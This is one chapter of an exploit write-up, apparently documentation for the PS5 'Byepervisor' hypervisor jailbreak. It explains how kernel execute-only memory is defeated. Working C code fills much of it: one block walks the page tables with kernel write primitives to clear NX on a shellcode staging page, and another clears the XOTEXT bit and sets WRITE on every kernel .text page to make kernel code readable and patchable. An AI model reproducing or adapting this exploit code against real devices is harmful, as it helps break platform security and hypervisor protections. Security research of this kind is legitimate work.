# 02 — Defeating XOTEXT

PS5 kernel `.text` is mapped **execute-only** by the hypervisor. The usual AMD64 PTE layout only has NX (bit 63), but the HV repurposes an AMD-reserved high bit as an "XOTEXT" marker so that a kernel-level reader faults even with `R` set.

## Observed bit used

```
PDE / PTE bit 58, mask 0x0400_0000_0000_0000  → XOTEXT
PDE / PTE bit  1, mask 0x0000_0000_0000_0002  → WRITE
PDE / PTE bit 63, mask 0x8000_0000_0000_0000  → NX (standard AMD64)
```

## Prep: clear NX for the shellcode staging page

Before loading `break_hv`, Byepervisor walks each PT level covering the scratch VA `kdldmap(0x3FFFF000)` and clears bit 63 (NX). If the entry is a huge page (bit 7 set), the walker stops at that level.

```c
uint64_t e;
rax = find_pml4e(ksym8, kdldmap(0x3ffff000), &e);
kwrite64(rax, e & 0x7fffffffffffffff);          // clear NX

rax = find_pdpe (ksym8, kdldmap(0x3ffff000), &e);
kwrite64(rax, e & 0x7fffffffffffffff);
if (!(e & (1 << 7))) {                           // not 1 GiB page?
    rax = find_pde(ksym8, kdldmap(0x3ffff000), &e);
    kwrite64(rax, e & 0x7fffffffffffffff);
    if (!(e & (1 << 7))) {                       // not 2 MiB page?
        rax = find_pte(ksym8, kdldmap(0x3ffff000), &e);
        kwrite64(rax, e & 0x7fffffffffffffff);
    }
}
```

## Main loop: clear XOTEXT, set WRITE on every .text page

```c
for (uint64_t va = ktext(0); va < *KERNEL_ADDRESS_DATA_BASE; va += 0x1000) {
    if ((pde = find_pde(ksym8, va, &e)) != ~0UL)
        kwrite64(pde, (e & ~0x0400000000000000) | 0x2);
    if ((pte = find_pte(ksym8, va, &e)) != ~0UL)
        kwrite64(pte, (e & ~0x0400000000000000) | 0x2);
}
```

Effect:

* `0x0400000000000000` cleared ⇒ XO flag off, kernel code becomes readable.
* `| 0x2` ⇒ WRITE bit on, kernel code becomes patchable.

The HV is not told; it still **thinks** the pages are XO because its nested-page tables aren't touched here — the actual compromise of the HV comes from the resume-hook chain, see `03-resume-hook.md` / `04-khook-chain.md`. After the chain runs on resume, the HV's shadow PT is bypassed, which is why `main` can later `kwrite64(ktext(8), 0x41414141)` and read it back as a "we have RW over kernel .text" demonstration.
